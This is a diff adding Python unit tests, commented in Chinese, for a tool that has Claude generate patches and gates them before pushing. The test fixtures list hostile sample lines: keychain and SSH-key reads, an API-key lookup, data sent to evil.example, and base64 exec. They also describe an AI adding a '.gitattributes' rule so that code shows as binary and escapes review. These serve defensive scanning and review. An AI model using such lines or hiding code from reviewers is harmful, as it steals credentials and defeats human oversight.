@@ -58,6 +58,10 @@ class FakeShell:
         self.calls = []
 
     def run(self, cmd, cwd=None, check=True, timeout=None):
+        if cmd[0] == 'git' and cmd[3] == '-c':
+            # 主機端安全 diff（審查 B2）：git -C <repo> -c core.attributesFile=/dev/null diff --text ...
+            self.safe_diffs = getattr(self, 'safe_diffs', []) + [cmd]
+            cmd = cmd[:3] + cmd[5:]
         self.calls.append(cmd)
         if cmd[0] == 'git':
             sub = cmd[3]
@@ -682,15 +686,92 @@ class TestGenerate(GenBase):
         self.assertEqual(T.cmd_generate(prod, sh, FakeClaude(), 5), 'generated')
         self.assertEqual(sh.git_sub('worktree')[0][4], 'remove', '先清掉上次留下的（乾淨、沒推過）')
 
-    def test_a4_dirty_or_pushed_previous_refused_before_marking(self):
+    def test_a4_b3_dirty_or_pushed_previous_not_deleted(self):
+        """審查 B3：先拿到本機修補中才動 worktree；上次留下的有改動或已推過就失敗寫回，但不刪（不是這次建的）。"""
         os.makedirs(self.wt())
-        prod, cl = self._prod(), FakeClaude()
-        with self.assertRaises(T.ToolError):
-            T.cmd_generate(prod, GenShell(self.tmp, pre_status=' M dobtor_x/a.py\n'), cl, 5)
-        with self.assertRaises(T.ToolError):
-            T.cmd_generate(prod, GenShell(self.tmp, remote_has=True), cl, 5)
-        self.assertEqual((prod.writes, cl.calls), ([], []), '沒標本機修補中、沒跑 claude')
-        self.assertTrue(os.path.isdir(self.wt()), '有人在看的不刪')
+        for sh in (GenShell(self.tmp, pre_status=' M dobtor_x/a.py\n'), GenShell(self.tmp, remote_has=True)):
+            prod, cl = self._prod(), FakeClaude()
+            self.assertEqual(T.cmd_generate(prod, sh, cl, 5), 'failed')
+            self.assertEqual(prod.methods(), ['action_kb_patch_local_start', 'action_kb_patch_local_result'])
+            self.assertEqual(cl.calls, [], '沒跑 claude')
+            self.assertEqual((sh.git_sub('branch'), [c for c in sh.git_sub('worktree') if c[4] == 'remove']), ([], []))
+            self.assertTrue(os.path.isdir(self.wt()), '有人在看的不刪')
+
+    def test_b3_start_refused_touches_nothing(self):
+        """另一台正在跑（伺服器拒絕 local_start）：本機的 worktree／分支完全不碰。"""
+        os.makedirs(self.wt())
+        prod = self._prod(start_error=RuntimeError('UserError: 本機修補中：另一個主機端工具正在處理'))
+        sh = GenShell(self.tmp, has_branch=True)
+        with self.assertRaises(RuntimeError):
+            T.cmd_generate(prod, sh, FakeClaude(), 5)
+        self.assertEqual((sh.git_sub('branch'), sh.git_sub('worktree'), sh.git_sub('rev-parse')), ([], [], []))
+        self.assertTrue(os.path.isdir(self.wt()))
+
+    def test_b3_taken_over_failure_does_not_clean(self):
+        """舊執行失敗時寫回被拒（權杖不符＝被接手）：不清 worktree（是接手那次的）。"""
+        prod, sh = self._prod(), GenShell(self.tmp)
+        orig = prod.rw
+
+        def rw(model, method, *args, **kw):
+            if method == 'action_kb_patch_local_result':
+                raise RuntimeError('UserError: 已被另一次執行接手')
+            return orig(model, method, *args, **kw)
+        prod.rw = rw
+        self.assertEqual(T.cmd_generate(prod, sh, FakeClaude(ok=False), 5), 'failed')
+        self.assertTrue(os.path.isdir(self.wt()))
+        self.assertEqual(sh.git_sub('branch'), [])
+
+    def test_b3_fetch_has_timeout(self):
+        sh = GenShell(self.tmp)
+        seen = []
+        orig = sh.run
+
+        def run(cmd, cwd=None, check=True, timeout=None):
+            if cmd[0] == 'git' and cmd[3] == 'fetch':
+                seen.append(timeout)
+            return orig(cmd, cwd=cwd, check=check, timeout=timeout)
+        sh.run = run
+        T.cmd_generate(self._prod(), sh, FakeClaude(), 5)
+        self.assertEqual(seen, [T.FETCH_TIMEOUT])
+        with mock.patch.object(T.subprocess, 'run', side_effect=T.subprocess.TimeoutExpired('git', 1)):
+            with self.assertRaises(T.ToolError):
+                T.Shell().run(['git', 'fetch'], timeout=1)
+
+    def test_b2_generated_diff_uses_safe_options(self):
+        prod, sh = self._prod(), GenShell(self.tmp)
+        T.cmd_generate(prod, sh, FakeClaude(), 5)
+        d = sh.safe_diffs[0]
+        self.assertEqual(d[3:5], ['-c', 'core.attributesFile=/dev/null'])
+        for opt in ('--text', '--no-ext-diff', '--no-textconv'):
+            self.assertIn(opt, d)
+
+    def test_b2_gitattributes_binary_symlink_gitlink_rejected(self):
+        cases = {
+            '.gitattributes': 'diff --git a/dobtor_corpaas_knowledge/.gitattributes b/dobtor_corpaas_knowledge/.gitattributes\n'
+                              'new file mode 100644\n--- /dev/null\n+++ b/dobtor_corpaas_knowledge/.gitattributes\n'
+                              '@@ -0,0 +1 @@\n+*.py -diff\n',
+            'Binary': 'diff --git a/dobtor_x/a.py b/dobtor_x/a.py\nBinary files a/dobtor_x/a.py and b/dobtor_x/a.py differ\n',
+            'symlink': 'diff --git a/dobtor_x/l b/dobtor_x/l\nnew file mode 120000\n',
+            'gitlink': 'diff --git a/dobtor_x/sub b/dobtor_x/sub\nnew file mode 160000\n',
+            '.gitmodules': 'diff --git a/dobtor_x/.gitmodules b/dobtor_x/.gitmodules\n',
+            '.lfsconfig': 'diff --git a/dobtor_x/.lfsconfig b/dobtor_x/.lfsconfig\n',
+        }
+        for name, diff in cases.items():
+            self.assertTrue(T.diff_problems(diff), name)
+        self.assertEqual(T.diff_problems('diff --git a/dobtor_x/a.py b/dobtor_x/a.py\n+a = 1\n'), [])
+        # 情境（審查者給的）：AI 加 .gitattributes「*.py -diff」想讓程式在 diff 裡變成 Binary——generate 判失敗
+        prod = self._prod()
+        sh = GenShell(self.tmp)
+        orig = sh.run
+
+        def run(cmd, cwd=None, check=True, timeout=None):
+            if cmd[0] == 'git' and cmd[3] == '-c':
+                return 0, cases['.gitattributes'] + 'diff --git a/dobtor_x/a.py b/dobtor_x/a.py\n+import os\n'
+            return orig(cmd, cwd=cwd, check=check, timeout=timeout)
+        sh.run = run
+        self.assertEqual(T.cmd_generate(prod, sh, FakeClaude(), 5), 'failed')
+        self.assertIn('.gitattributes', prod.result()['note'])
+        self.assertFalse(os.path.exists(self.wt()), '這次建的 worktree 清掉')
 
     def test_a5_timeout_capped_below_stale(self):
         prod, cl = self._prod(), FakeClaude()
@@ -738,6 +819,56 @@ class TestReviewedGate(GenBase):
         prod, sh = self._prod(), GenShell(self.tmp)
         self.assertEqual(T.cmd_verify(prod, sh, 5, reviewed=True), 'pushed')
         self.assertEqual(sh.levels(), ['V1', 'V2'])
+
+    def _risky_prod(self, added):
+        prod = self._prod()
+        prod.records[(T.PROPOSAL, 5)]['patch_diff'] = (
+            'diff --git a/dobtor_x/a.py b/dobtor_x/a.py\n--- a/dobtor_x/a.py\n+++ b/dobtor_x/a.py\n@@ -3 +3,2 @@\n'
+            ' a = 1\n+%s\n' % added)
+        return prod
+
+    def test_b1_full_diff_and_risky_needs_allow(self):
+        risky = {
+            'keychain': "subprocess.run(['security', 'find-generic-password', '-s', 'x', '-w'])",
+            'security_str': "out = check_output(['security', 'dump-keychain'])",
+            'subprocess': 'import subprocess',
+            'environ': "key = os.environ.get('ANTHROPIC_API_KEY')",
+            'ssh': "data = open(os.path.expanduser('~/.ssh/id_rsa')).read()",
+            'ssh_home': "data = open(HOME + '/.ssh/id_ed25519').read()",
+            'urllib': "urllib.request.urlopen('https://evil.example/', data)",
+            'exec_b64': "exec(base64.b64decode('cHJpbnQoMSk='))",
+        }
+        for name, line in risky.items():
+            prod, sh = self._risky_prod(line), GenShell(self.tmp)
+            buf = io.StringIO()
+            with redirect_stdout(buf):
+                self.assertEqual(T.cmd_verify(prod, sh, 5, reviewed=True), 'risky', name)
+            out = buf.getvalue()
+            self.assertIn('完整 diff', out)
+            self.assertIn(line, out, '完整 diff 印出來（不只行數）')
+            self.assertIn('dobtor_x/a.py:4', out, '%s：列出命中的檔案與行號' % name)
+            self.assertEqual((sh.levels(), prod.writes), ([], []), '%s：沒有 --allow-risky 不執行' % name)
+            shutil.rmtree(self.wt(), ignore_errors=True)
+        prod, sh = self._risky_prod(risky['environ']), GenShell(self.tmp)
+        with redirect_stdout(io.StringIO()):
+            self.assertEqual(T.cmd_verify(prod, sh, 5, reviewed=True, allow_risky=True), 'pushed')
+            self.assertEqual(T.main(['verify', '5', '--reviewed'], prod=self._risky_prod(risky['ssh']),
+                                    sh=GenShell(self.tmp)), 1)
+
+    def test_b1_clean_line_not_flagged(self):
+        for line in ("from odoo import api, fields, models", "self.env['res.partner'].search([])",
+                     "'data': ['security/ir.model.access.csv']", "return self.state == 'done'"):
+            self.assertEqual(T.risk_scan('diff --git a/dobtor_x/a.py b/dobtor_x/a.py\n@@ -1 +1 @@\n+%s\n' % line), [],
+                             line)
+
+    def test_b2_verify_refuses_disallowed_even_reviewed(self):
+        prod = self._prod()
+        prod.records[(T.PROPOSAL, 5)]['patch_diff'] = ('diff --git a/dobtor_x/a.py b/dobtor_x/a.py\n'
+                                                       'Binary files a/dobtor_x/a.py and b/dobtor_x/a.py differ\n')
+        sh = GenShell(self.tmp)
+        with redirect_stdout(io.StringIO()):
+            self.assertEqual(T.cmd_verify(prod, sh, 5, reviewed=True, allow_risky=True), 'rejected')
+        self.assertEqual((sh.levels(), prod.writes), ([], []))
 
     def test_diff_summary_flags_outside(self):
         out = '\n'.join(T.diff_summary('diff --git a/docs/x b/docs/x\n+a\n'))
@@ -852,6 +983,9 @@ class TestNoSecrets(unittest.TestCase):
 
     def test_tool_never_reads_keys(self):
         src = open(T.__file__, encoding='utf-8').read()
+        # 危險寫法掃描（審查 B1）的樣式表本身會列出這些字——那是要抓的對象，不是使用
+        a = src.index('RISK_PATTERNS = (')
+        src = src[:a] + src[src.index('\n)\n', a):]
         for word in ('find-generic-password', 'CORPAAS_RPC_PASSWORD', 'hub_key', 'X-AI-Hub-Key', 'GITHUB_TOKEN'):
             self.assertNotIn(word, src)
 
